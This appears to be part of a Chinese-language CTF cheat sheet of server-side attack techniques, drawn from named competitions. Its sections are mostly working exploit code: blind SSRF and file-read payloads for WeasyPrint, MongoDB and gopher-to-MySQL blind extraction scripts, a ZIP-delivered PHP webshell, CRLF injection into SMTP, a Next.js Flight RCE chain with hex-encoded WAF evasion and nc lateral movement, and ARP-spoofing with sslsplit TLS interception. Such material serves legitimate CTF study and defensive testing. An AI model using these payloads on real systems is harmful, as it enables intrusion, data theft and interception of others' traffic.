# Server-Side Advanced Techniques (Part 4)

## Table of Contents
- [WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)](#weasyprint-ssrf--file-read-cve-2024-28184-nullcon-2026)
  - [Variant 1: Blind SSRF via Attachment Oracle](#variant-1-blind-ssrf-via-attachment-oracle)
  - [Variant 2: Local File Read via file:// Attachment](#variant-2-local-file-read-via-file-attachment)
- [MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)](#mongodb-regex-injection--where-blind-oracle-nullcon-2026)
- [Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)](#pongo2--go-template-injection-via-path-traversal-nullcon-2026)
- [ZIP Upload with PHP Webshell (Nullcon 2026)](#zip-upload-with-php-webshell-nullcon-2026)
- [basename() Bypass for Hidden Files (Nullcon 2026)](#basename-bypass-for-hidden-files-nullcon-2026)
- [wget CRLF Injection for SSRF-to-SMTP (SECCON 2017)](#wget-crlf-injection-for-ssrf-to-smtp-seccon-2017)
- [Gopher SSRF to MySQL Blind SQLi (34C3 CTF 2017, AceBear 2018)](#gopher-ssrf-to-mysql-blind-sqli-34c3-ctf-2017-acebear-2018)
- [React Server Components Flight Protocol RCE (Ehax 2026)](#react-server-components-flight-protocol-rce-ehax-2026)
  - [Step 1 — Identify RSC via HTTP headers](#step-1--identify-rsc-via-http-headers)
  - [Step 2 — Exploit Flight deserialization for RCE](#step-2--exploit-flight-deserialization-for-rce)
  - [Step 3 — Exfiltrate data via NEXT_REDIRECT](#step-3--exfiltrate-data-via-next_redirect)
  - [Step 4 — Bypass WAF keyword filters](#step-4--bypass-waf-keyword-filters)
  - [Step 5 — Post-RCE enumeration](#step-5--post-rce-enumeration)
  - [Step 6 — Lateral movement to internal services](#step-6--lateral-movement-to-internal-services)
- [AMQP/TLS Interception via sslsplit + arpspoof (TAMUctf 2019)](#amqptls-interception-via-sslsplit--arpspoof-tamuctf-2019)
- [CairoSVG XXE via Oversized width= (BSidesSF 2019)](#cairosvg-xxe-via-oversized-width-bsidessf-2019)
- [Bazaar (.bzr) Repository Reconstruction via bzr check Loop (STEM CTF 2019)](#bazaar-bzr-repository-reconstruction-via-bzr-check-loop-stem-ctf-2019)

另见 [server-side-advanced.md](server-side-advanced.md) 的第 1 部分（ExifTool DjVu、Go rune/byte、ZIP symlink、路径穿越绕过、Nginx alias、Unicode 同形字符、Ruby `Regexp.escape`、`/dev/fd`、Flask/Werkzeug 调试模式、XXE DTD 过滤绕过、`%2f` 绕过）。另见 [server-side-advanced-2.md](server-side-advanced-2.md) 的第 2 部分。另见 [server-side-advanced-3.md](server-side-advanced-3.md) 的第 3 部分。

---

## WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)

**模式（Web 2 Doc 1/2）：** 应用会把用户提供的 URL 转成 PDF。附件抓取走的是另一条代码路径，可绕过内部头检查，并可读取本地文件。

### Variant 1: Blind SSRF via Attachment Oracle
WeasyPrint 的 `<a rel="attachment" href="...">` 会在独立代码路径中抓取该 URL，不会带上 `X-Fetcher` 之类的内部头。如果目标只允许 localhost 访问，那么附件抓取会从 localhost 成功命中。

**布尔预言机：** 只有当目标返回 HTTP 200 时，嵌入文件才会出现在 PDF 中：
```python
# Check for embedded attachment in PDF
def has_attachment(pdf_bytes):
    return b"/Type /EmbeddedFile" in pdf_bytes

# Blind extraction via charCodeAt oracle
for i in range(flag_len):
    for ch in charset:
        html = f'<a rel="attachment" href="http://127.0.0.1:5000/admin/flag?i={i}&c={ch}">A</a>'
        pdf = convert_url_to_pdf(host_html(html))
        if has_attachment(pdf):
            flag += ch; break
```

### Variant 2: Local File Read via file:// Attachment
```html
<!-- Host this HTML, submit URL to converter -->
<link rel="attachment" href="file:///flag.txt">
```
**提取：** `pdfdetach -save 1 -o flag.txt output.pdf`

**关键点：** WeasyPrint 会处理 `<link rel="attachment">` 和 `<a rel="attachment">`，两者都可引用 `file://` 或内网 URL。附件会作为文件流嵌入 PDF。

---

## MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)

**模式（CVE DB）：** 搜索输入被直接插入 MongoDB 查询中的 `/.../i` 正则。可跳出正则上下文并注入任意 JS 条件。

**注入载荷：**
```text
a^/)||(<JS_CONDITION>)&&(/a^
```
该载荷会打断正则上下文并插入一个布尔条件，结果条数可作为真值回显。

**二分提取：**
```python
def oracle(condition):
    # Inject into regex context
    payload = f"a^/)||(({condition}))&&(/a^"
    html = post_search(payload)
    return parse_result_count(html) > 0

# Find flag length
lo, hi = 1, 256
while lo < hi:
    mid = (lo + hi + 1) // 2
    if oracle(f"this.product.length>{mid}"): lo = mid
    else: hi = mid - 1
length = lo + 1

# Extract each character
for i in range(length):
    l, h = 31, 126
    while l < h:
        m = (l + h + 1) // 2
        if oracle(f"this.product.charCodeAt({i})>{m}"): l = m
        else: h = m - 1
    flag += chr(l + 1)
```

**检测：** 若 MongoDB 的 `$regex` 或 `$where` 中含有未净化输入，可测试 `a/)||true&&(/a` 与 `a/)||false&&(/a` 的结果条数是否不同，以确认注入。

---

## Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)

**模式（WordPress Static Site Generator）：** Go 应用用 Pongo2 渲染模板，而模板参数存在路径穿越，可渲染用户上传文件。

**攻击链：**
1. 上传文件，内容写成：`{% include "/flag.txt" %}`
2. 从 session cookie 中取上传 ID（base64 解码并提取十六进制 ID）
3. 通过路径穿越请求渲染：`/generate?template=../uploads/<id>/pwn`

**Pongo2 SSTI 载荷：**
```text
{% include "/etc/passwd" %}
{% include "/flag.txt" %}
{{ "test" | upper }}
```

**检测：** Go Web 应用若同时存在模板渲染和文件上传，就要检查源码中是否使用 `pongo2`、`jet` 或标准 `html/template`。

---

## ZIP Upload with PHP Webshell (Nullcon 2026)

**模式（virus_analyzer）：** 应用允许上传 ZIP，解压到 Web 可访问目录，并直接提供这些解压后文件。

**利用：**
```bash
# Create PHP webshell
echo '<?php echo file_get_contents("/flag.txt"); ?>' > shell.php
zip payload.zip shell.php
curl -F 'zipfile=@payload.zip' http://target/
# Access: http://target/uploads/<id>/shell.php
```

**变种：**
- 若 `system()` 被禁用（提示 "Cannot fork"），可改用 `file_get_contents()` 或 `readfile()`
- 若 `.php` 被拦截，尝试 `.phtml`、`.php5`、`.phar`，或先上传 `.htaccess`
- 若文件在解压后会被删除，需立刻访问，利用竞态窗口

---

## basename() Bypass for Hidden Files (Nullcon 2026)

**模式（Flowt Theory 2）：** 应用用 `basename()` 防路径穿越，但它只会去掉目录部分，同目录下的隐藏文件和点文件依然可访问。

**利用：**
```bash
# basename() allows .lock, .htaccess, etc.
curl "http://target/?view_receipt=.lock"
# .lock reveals secret filename
curl "http://target/?view_receipt=secret_XXXXXXXX"
```

**关键点：** `basename()` 不是安全函数，只负责提取文件名组件。它不会过滤隐藏文件（`.foo`）、备份文件（`file~`），也不会拒绝任何不含目录分隔符的文件名。

---

## wget CRLF Injection for SSRF-to-SMTP (SECCON 2017)

**模式：** 1.17.1 之前的 wget（尤其是 CentOS 7 常见的 1.14）不会清洗 HTTP Host 头中的 CRLF（`%0d%0a`）。如果 SSRF 能控制 wget 拉取的 URL，就可以把 CRLF 注入 hostname 中，从而插入任意协议命令。若目标是内网 25 端口 SMTP 服务，就能发送任意邮件。

```text
# CRLF-injected URL targeting internal SMTP on port 25:
# Key: the port :25/ must come at the END to avoid "Bad port number" errors
http://127.0.0.1%0D%0AHELO%20x%0D%0AMAIL%20FROM%3A%3Cattacker%40x.com%3E%0D%0ARCPT%20TO%3A%3Croot%3E%0D%0ADATA%0D%0ASubject%3A%20give%20me%20flag%0D%0Aabc%0D%0A.%0D%0A:25/
```

```python
import requests
import urllib.parse

# Build the CRLF-injected SMTP conversation
smtp_commands = "\r\n".join([
    "HELO x",
    "MAIL FROM:<attacker@x.com>",
    "RCPT TO:<root>",
    "DATA",
    "Subject: give me flag",
    "",
    "Send me the flag please",
    ".",
])

# URL-encode the SMTP commands for injection into the hostname
encoded = urllib.parse.quote(smtp_commands, safe='')

# Port must be at the end to avoid wget "Bad port number" error
ssrf_url = f"http://127.0.0.1{encoded}:25/"

# Trigger the SSRF
requests.post("http://target/fetch", data={"url": ssrf_url})
# wget connects to 127.0.0.1:25 and sends the SMTP commands as part of the HTTP request
# The SMTP server processes the injected commands and delivers the email
```

**关键点：** 1.17.1 之前的 wget 不会清理 Host 头中的 CRLF。只要 SSRF 能到达内网 SMTP，CRLF 注入就能发送任意邮件。务必把端口写在注入串末尾，避免触发 "Bad port number"。该技巧也可扩展到任何可通过 SSRF 访问的按行协议（FTP、Redis、memcached）。其他 SSRF 技巧见 [server-side.md](server-side.md#ssrf)。

---

## Gopher SSRF to MySQL Blind SQLi (34C3 CTF 2017, AceBear 2018)

**模式：** 当 SSRF 支持 `gopher://` 协议时，可构造原始 MySQL 协议包与本地 MySQL 通信，前提是该实例开启了无密码认证（CTF 中很常见）。再结合基于 `SLEEP()` 的时间盲注即可提取数据。

```python
import urllib.parse
import requests
import time

# Step 1: Capture a real MySQL session with tcpdump
# tcpdump -i lo port 3306 -w mysql.pcap
# Connect to MySQL normally: mysql -u root
# Execute a simple query, then disconnect
# Extract the client auth packet and query packet bytes from the pcap

# Step 2: Build the gopher payload
# MySQL auth packet (handshake response) - extract from pcap
auth_packet = bytearray([
    0x48, 0x00, 0x00, 0x01,  # packet length + sequence
    0x85, 0xa6, 0x03, 0x00,  # client capabilities
    # ... remaining auth packet bytes from tcpdump capture
])

# MySQL query packet
def build_query_packet(sql):
    payload = b'\x03' + sql.encode()  # 0x03 = COM_QUERY
    length = len(payload)
    # MySQL packet: 3-byte length (little-endian) + 1-byte sequence number
    header = length.to_bytes(3, 'little') + b'\x00'
    return header + payload

# Step 3: Time-based blind extraction
flag = ""
for pos in range(1, 50):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789_{}-":
        query = f"SELECT IF(SUBSTRING((SELECT flag FROM secrets LIMIT 1),{pos},1)='{char}',SLEEP(3),0)"
        query_packet = build_query_packet(query)

        # Combine auth + query, URL-encode for gopher
        raw_data = bytes(auth_packet) + bytes(query_packet)
        encoded = urllib.parse.quote(raw_data, safe='')

        # Double-encode if the SSRF handler URL-decodes once
        double_encoded = urllib.parse.quote(encoded, safe='')

        gopher_url = f"gopher://127.0.0.1:3306/_{double_encoded}"

        start = time.time()
        requests.get("http://target/fetch", params={"url": gopher_url})
        elapsed = time.time() - start

        if elapsed > 3.0:
            flag += char
            print(f"Flag so far: {flag}")
            break

print(f"Final flag: {flag}")
```

**关键点：** `gopher://` 可直接发送原始 TCP 数据，因此几乎能与任意 TCP 服务通信。思路是先用 `tcpdump` 抓一段合法 MySQL 会话，再把认证包和查询包通过 gopher 重放。若 SSRF 端会先 URL 解码一次，记得双重编码。该技巧同样适用于 PostgreSQL、Redis 等 SSRF 可达的 TCP 服务。SQL 注入技巧见 [sql-injection.md](sql-injection.md)。

---

## React Server Components Flight Protocol RCE (Ehax 2026)

**模式（Flight Risk）：** 使用 React Server Components（RSC）的 Next.js 应用会在服务端反序列化客户端发送的 Flight 对象。构造假的 Flight chunk 后，可通过构造器链（`constructor → constructor → Function`）实现任意代码执行（CVE-2025-55182）。

### Step 1 — Identify RSC via HTTP headers

在浏览器 Network 面板中拦截表单提交。RSC 特征头如下：
```http
POST / HTTP/1.1
Next-Action: 7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd
Accept: text/x-component
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D
Content-Type: multipart/form-data; boundary=----x
```

再到客户端 JS bundle 中确认服务端函数名：
```javascript
createServerReference("7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd", callServer, void 0, findSourceMapURL, "greetUser")
```

### Step 2 — Exploit Flight deserialization for RCE

在 multipart 表单体中构造伪造的 Flight chunk。`_prefix` 字段承载实际 payload。通过构造器链（`constructor → constructor → Function`）可在服务端执行任意 JavaScript。

请求结构：
```http
POST / HTTP/1.1
Host: target
Next-Action: <action_hash>
Accept: text/x-component
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="0"

THE FAKE FLIGHT CHUNK HERE
------x
Content-Disposition: form-data; name="1"

"$@0"
------x--
```

### Step 3 — Exfiltrate data via NEXT_REDIRECT

Next.js 内部会用 `NEXT_REDIRECT` 错误完成跳转。可借此通过响应头 `x-action-redirect` 外带数据：

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${encodeURIComponent(RESULT)};307;`
});
```

服务端响应为：
```http
HTTP/1.1 303 See Other
x-action-redirect: /login?a=<exfiltrated_data>;push
```

示例，使用 `process.pid` 验证 RCE：
```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${process.pid};307;`
});
// Response: x-action-redirect: /login?a=1;push
```

### Step 4 — Bypass WAF keyword filters

当 `child_process`、`execSync`、`mainModule` 等关键字会触发 403 且返回 "WAF Alert" 时，可用以下方式绕过：

1. **字符串拼接：**
   ```javascript
   p['main'+'Module']['requ'+'ire']('chi'+'ld_pro'+'cess')
   ```

2. **十六进制编码：**
   ```javascript
   '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'  // child_process
   '\x65\x78\x65\x63\x53\x79\x6e\x63'                        // execSync
   ```

3. **组合进 payload：**
   ```javascript
   var p=process;
   var m=p['main'+'Module'];
   var r=m['requ'+'ire'];
   var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
   var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63']('id').toString();
   throw Object.assign(new Error('NEXT_REDIRECT'),
     {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
   ```

### Step 5 — Post-RCE enumeration

```javascript
// Working directory
process.cwd()                        // → /app

// Process arguments
process.argv                         // → /usr/local/bin/node,/app/server.js

// List files
process.mainModule.require('fs').readdirSync(process.cwd()).join(',')

// Read files
process.mainModule.require('fs').readFileSync('vault.hint').toString('hex')

// Check available modules
Object.keys(process.mainModule.require('http'))
```

### Step 6 — Lateral movement to internal services

发现内网服务线索后（例如来自 hint 文件）：
```javascript
// Use nc to reach internal HTTP services
var p=process;var m=p['main'+'Module'];var r=m['requ'+'ire'];
var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63'](
  'printf "GET /flag.txt HTTP/1.1\\r\\nHost: internal-vault\\r\\n\\r\\n" | nc internal-vault 9009'
).toString();
throw Object.assign(new Error('NEXT_REDIRECT'),
  {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
```

**关键点：** `NEXT_REDIRECT` 机制提供了稳定的带外数据回显通道，数据会出现在 `x-action-redirect` 头里。再叠加字符串拼接与十六进制编码的 WAF 绕过，即使在有过滤的环境中也能实现完整 RCE。

**完整利用链：** 识别 RSC 请求头 → 构造假 Flight chunk → 绕过 WAF → 获取 RCE → 枚举文件系统 → 发现内网服务 → 借助 `nc` 横向访问并取 flag。

**检测：** 请求中出现 `Accept: text/x-component` 与 `Next-Action` 头，客户端 JS 中存在 `createServerReference()`，以及 Next.js Server Actions 接收用户可控表单数据。

---

## AMQP/TLS Interception via sslsplit + arpspoof (TAMUctf 2019)

**模式：** 某 Web shim 会向内网 RabbitMQ（`5671/tcp`，AMQPS）投递 JSON 任务 `{"user": "alice", "code": "..."}`。客户端几乎不会做证书固定，因此只要同时对两端做 ARP 欺骗，并用 sslsplit 终止 TLS，就能看到明文 AMQP 帧，甚至可在中途把 `"alice"` 改成 `"root"` 达到提权。

```bash
# 1. Sit between the web server and the broker (both ways)
arpspoof -i eth0 -t 172.30.0.2 172.30.0.4 &
arpspoof -i eth0 -t 172.30.0.4 172.30.0.2 &

# 2. Redirect the AMQP port into sslsplit
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 5671 -j REDIRECT --to-ports 1234
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
mkdir /tmp/sslsplit logdir
sudo sslsplit -D -l connections.log -j /tmp/sslsplit -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 1234
cat logdir/*    # shows plaintext AMQP frames with the JSON body

# 3. For on-the-fly rewriting, patch mitmproxy's raw TCP layer:
#    mitmproxy/proxy/protocol/rawtcp.py, RawTCPLayer._handle_server_message():
#        x = buf[:size].tobytes().replace(b'"user": "alice",', b'"user": "root", ')
#        tcp_message = tcp.TCPMessage(dst == server, x)
mitmproxy --mode transparent --listen-port 1234 --ssl-insecure \
          --tcp-hosts 172.30.0.2 --tcp-hosts 172.30.0.4
```

**关键点：** 未启用证书固定的客户端会接受任意受信 CA 签发的证书；sslsplit 能终止 TLS 并记录明文，因此任何 TLS 封装协议（AMQP、IRC、MQTT、LDAPS、自定义二进制协议）都能被观察，配合轻微修改 mitmproxy 还能被动态篡改。Burp 和 mitmproxy 主要面向 HTTPS；要处理中任意协议时，优先考虑 sslsplit/sslsniff 这类工具。

**参考：** TAMUctf 2019 — Homework Help, writeup 13477

---

## CairoSVG XXE via Oversized width= (BSidesSF 2019)

**模式：** 某 Web 服务会用 CairoSVG 将用户提供的 SVG 渲染为 PNG。CairoSVG（以及 librsvg/ImageMagick/rsvg-convert）会在光栅化之前解析 XML `DOCTYPE` 实体，因此把 XXE 实体放进 `<text>` 中后，目标文件内容会被直接画进 PNG。难点在于像素宽度必须足够容纳字符串；如果目标文件较大，如 `/proc/self/status`，需要把 `width` 提高到约 20000（再高到 ~34000 左右服务器可能在渲染时超时），否则文本会被裁剪。

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [<!ENTITY xx SYSTEM "file:///proc/self/status">]>
<svg height="300" width="20000" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="15" fill="red">test &xx;; test</text>
</svg>
```

上传后下载 PNG，再直接从图像中读 flag（肉眼或 OCR）。在探测 flag 路径时，先读取 `/proc/self/status` 找 PID，再去试 `/proc/<pid>/cwd/flag.txt`、`/proc/<pid>/cmdline` 和 `/proc/<pid>/environ`。如果第一次渲染仍被截断（如 `width=3000`），就继续加宽。BSidesSF 2019 的 SVGMagic 里，目标路径较短，`width="3000"` 就足够。

**关键点：** 只要 SVG 渲染器会处理 DOCTYPE 和 ENTITY 展开，就和普通 XML 解析器一样存在 XXE。读取大文件时要把 `width` 调大，且别忘了输出通道是“像素”而不是文本。拿到 PNG 后，可先 OCR（如 `tesseract img.png -`）再搜索 flag，也可直接手工查看。

**参考：** BSidesSF 2019 CTF — SVGMagic (PNGSVG), writeup 13711。另见 [server-side-2.md](server-side-2.md) 中的 svglib 变种。

---

## Bazaar (.bzr) Repository Reconstruction via bzr check Loop (STEM CTF 2019)

**模式：** Web 服务器暴露了 `/.bzr/`（目录索引返回 403，但具体文件返回 200）。Bazaar 的历史数据由少量 index + pack 文件组成；`bzr check` 能容忍不完整仓库，并在缺失数据时把预期路径打印在错误信息里。于是可以循环读取错误并 `wget` 缺失文件，逐步把仓库重建出来；随后执行 `bzr revert` 和 `bzr diff` 即可看到所有历史修订，包括后来被删掉的秘密。

```bash
# 1. Seed a local repo so bzr has a skeleton to work with
mkdir ctf && cd ctf && bzr init
echo foo > foo.txt && bzr add && bzr commit -m init && rm foo.txt

# 2. Replace the pointer files with copies from the victim
cd .bzr/branch     && rm last-revision && wget http://target/.bzr/branch/last-revision
cd ../checkout     && rm dirstate       && wget http://target/.bzr/checkout/dirstate
cd ../repository   && rm pack-names     && wget http://target/.bzr/repository/pack-names
cd ../../

# 3. Loop until bzr check stops complaining about missing indices/packs
while true; do
  OUT=$(bzr check 2>&1)
  [[ "$OUT" != *"No such file:"* ]] && break
  F=$(echo "$OUT" | sed 's/.*\([0-9a-f]\{32\}\).*/\1/')
  for EXT in cix iix rix six tix; do
    wget -P .bzr/repository/indices/ "http://target/.bzr/repository/indices/$F.$EXT"
  done
  wget -P .bzr/repository/packs/ "http://target/.bzr/repository/packs/$F.pack"
done
bzr revert

# 4. Mine every revision for interesting diffs
for R in $(bzr log --line | awk '{print $1}'); do bzr diff -r$((R-1))..$R; done
```

**关键点：** 暴露的 `.bzr/`（以及 `.git/`、`.hg/`、`.svn/`）目录会泄露完整提交历史；Bazaar 尤其容易利用，因为它能容忍部分仓库并把缺失路径原样打印出来，所以循环 `wget` 即可自动补全。分析时不要只看 `HEAD`，一定要 diff 各个 revision，因为 flag、钱包私钥、解密密钥往往是在后续提交里被“删除”的。仓库一旦重建完成，还可继续串联类似 STEM CTF “Medium is overrated” 这样的题：一个 revision 里存 base64 密文，另一个 revision 里存 AES-ECB 密钥。

**参考：** STEM CTF Cyber Challenge 2019 — My First Blog & Medium is overrated, writeups 13380 和 13379
